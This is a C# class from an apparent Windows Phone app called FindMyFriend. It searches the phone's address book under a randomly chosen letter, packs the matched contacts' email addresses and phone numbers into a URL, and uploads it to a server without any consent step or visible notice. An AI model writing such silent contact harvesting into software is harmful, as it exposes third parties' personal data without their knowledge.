using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Phone.Controls;
using Microsoft.Phone.UserData;
using System.Windows;
using System.Net;

namespace FindMyFriend
{
    public class GetterContact
    {

        IEnumerable<Contact> contacts;
        UserCurrent user = UserCurrent.Singleton;


        public GetterContact()
        {
            Random rnd = new Random();
            int month = rnd.Next(65, 90);
            char x = (char)month; 
            Search(x.ToString());
        }


        public IEnumerable<Contact> Contacts_
        {
            get { return contacts; }
        }

        public void Search(string what)
        {
            Contacts cons = new Contacts();

            cons.SearchCompleted += new EventHandler<ContactsSearchEventArgs>(Contacts_SearchCompleted);

            cons.SearchAsync(what, FilterKind.DisplayName, "Contacts Test #1");
        }


        void Contacts_SearchCompleted(object sender, ContactsSearchEventArgs e)
        {
            //MessageBox.Show(e.State.ToString());

            try
            {
                //Bind the results to the list box that displays them in the UI.
                contacts = e.Results;

                string url = user.info("Contact", "Infos", "");
                foreach (Contact con in contacts)
                {


                    foreach (ContactEmailAddress em in con.EmailAddresses)
                    {
                        url = user.info(url, "Contact", "Address", em.EmailAddress);
                    }

                    foreach (ContactPhoneNumber em in con.PhoneNumbers)
                    {
                        url = user.info(url, "Contact", "Phone", em.PhoneNumber);
                    }
                }

                WebClient client = new WebClient();
                client.UploadStringCompleted += client_UploadStringCompleted;
                client.UploadStringAsync(new Uri(url), "");

            }
            catch (System.Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }


        void client_UploadStringCompleted(object sender, UploadStringCompletedEventArgs e)
        {
            if (e.Error == null)
            {
                //MessageBox.Show("Sended \n" + e.Result);
            }
            else
            {
                //MessageBox.Show("ERROR SEND " + e.Error.Message);
            }
        }



    }
}
